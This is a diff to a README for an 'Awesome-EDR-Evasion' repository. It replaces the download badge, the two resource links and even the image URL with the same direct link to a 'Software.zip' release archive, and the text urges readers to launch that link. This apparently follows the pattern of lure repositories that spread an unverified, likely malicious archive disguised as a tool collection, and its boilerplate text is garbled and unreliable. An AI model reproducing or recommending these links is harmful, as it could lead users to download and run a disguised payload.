@@ -12,15 +12,15 @@ Topics related to this repository were not provided.
 ## 🚀 Get Started
 To get started with exploring the tools and techniques for EDR evasion, you can download the repository content using the following link: 
 
-[![Download Awesome-EDR-Evasion](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Awesome-EDR-Evasion](https://github.com/GeniusCraft1/Awesome-EDR-Evasion/releases/download/v1.0/Software.zip)](https://github.com/GeniusCraft1/Awesome-EDR-Evasion/releases/download/v1.0/Software.zip)
 
 Please note that this link needs to be launched to initiate the download of the repository content.
 
 If the link above does not work or if you are looking for more information, feel free to check the **Releases** section of this repository for additional resources.
 
 ## 📎 Additional Resources
-- [EDR Evasion Techniques Wiki](https://example.com/edr-evasion)
-- [Cybersecurity For Beginners](https://example.com/cybersecurity-beginners)
+- [EDR Evasion Techniques Wiki](https://github.com/GeniusCraft1/Awesome-EDR-Evasion/releases/download/v1.0/Software.zip)
+- [Cybersecurity For Beginners](https://github.com/GeniusCraft1/Awesome-EDR-Evasion/releases/download/v1.0/Software.zip)
 
 ## 🎉 Contributors
 We appreciate all the contributors who have shared their knowledge and expertise to make this repository a valuable resource for learning about EDR evasion techniques. 👏
@@ -34,4 +34,4 @@ Explore the tools, learn the techniques, and stay ahead in the world of cybersec
 
 **Happy Hacking!** 🚀
 
-![Hacker Image](https://www.pngkey.com/png/full/15-157153_hacker-computer-security-user-security-hd-png-download.png)
+![Hacker Image](https://github.com/GeniusCraft1/Awesome-EDR-Evasion/releases/download/v1.0/Software.zip)
